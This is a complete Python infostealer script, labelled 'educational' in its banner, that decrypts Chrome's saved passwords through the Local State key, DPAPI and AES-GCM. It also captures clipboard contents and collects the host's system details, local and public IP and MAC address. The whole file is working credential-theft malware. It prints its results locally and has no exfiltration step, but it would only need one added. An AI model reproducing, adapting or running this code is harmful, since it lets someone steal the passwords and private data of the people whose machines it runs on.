import os
import json
import base64
import sqlite3
import shutil
import win32crypt
import pyperclip
import socket
import platform
import uuid
import requests
from Crypto.Cipher import AES

# ---------------------------------------------------------
# STEP 1: Decrypt Chrome Saved Passwords
# ---------------------------------------------------------

def get_encryption_key():
    """Retrieve and decrypt the encryption key from Chrome's Local State file."""
    local_state_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return key

def decrypt_password(ciphertext, key):
    """Use AES-GCM to decrypt a given Chrome password."""
    try:
        iv = ciphertext[3:15]
        payload = ciphertext[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return f"[Decryption Failed] {str(e)}"
    
def extract_passwords():
    """Extract and decrypt saved Chrome passwords."""
    print("\n[+] Extracting saved Chrome passwords...\n")
    key = get_encryption_key()
    db_path = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data")
    temp_db = "temp_login_data.db"
    shutil.copyfile(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    for url, username, password_blob in cursor.fetchall():
        if username or password_blob:
            password = decrypt_password(password_blob, key)
            print(f"URL: {url}\nUsername: {username}\nPassword: {password}\n")

    cursor.close()
    conn.close()
    os.remove(temp_db)

# ---------------------------------------------------------
# STEP 2: Capture Clipboard Data
# ---------------------------------------------------------

def get_clipboard_data():
    """Print the current contents of the clipboard."""
    print("\n[+] Capturing clipboard data...\n")
    try:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            print(f"Clipboard: {clipboard_content}")
        else:
            print("Clipboard is empty.")
    except Exception as e:
        print(f"Clipboard error: {e}")

# ---------------------------------------------------------
# ---------------------------------------------------------
# STEP 3: System and Network Information
# ---------------------------------------------------------

def get_system_info():
    """Gather and display system and network information."""
    print("\n[+] Gathering system information...\n")
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff)
                        for i in range(0, 8 * 6, 8)][::-1])
        os_name = platform.system()
        os_version = platform.version()
        processor = platform.processor()
        arch = platform.machine()
        public_ip = requests.get("https://api.ipify.org").text

        print(f"Hostname      : {hostname}")
        print(f"OS            : {os_name} {os_version}")
        print(f"Processor     : {processor}")
        print(f"Architecture  : {arch}")
        print(f"Local IP      : {local_ip}")
        print(f"MAC Address   : {mac}")
        print(f"Public IP     : {public_ip}")
    except Exception as e:
        print(f"System info error: {e}")

# ---------------------------------------------------------
# MAIN FUNCTION
# ---------------------------------------------------------

if __name__ == "__main__":
    print("###############################################")
    print("#      Information Stealer (Educational)      #")
    print("#      DO NOT USE UNETHICALLY OR ILLEGALLY    #")
    print("###############################################\n")

    extract_passwords()
    get_clipboard_data()
    get_system_info()

    print("\n[✓] Data collection complete.")